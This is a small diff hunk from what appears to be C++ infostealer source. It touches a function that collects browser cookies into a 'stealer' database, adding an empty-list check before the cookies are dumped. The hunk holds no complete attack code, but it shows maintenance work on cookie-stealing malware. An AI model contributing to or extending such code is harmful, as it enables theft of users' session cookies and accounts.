@@ -165,6 +165,9 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 		}
 	}
 
+	if (data_list.size() == 0)
+		return false;
+
 	if (!dump_cookie_data(stealer_db, data_list, data_list.size()))
 		return false;
 
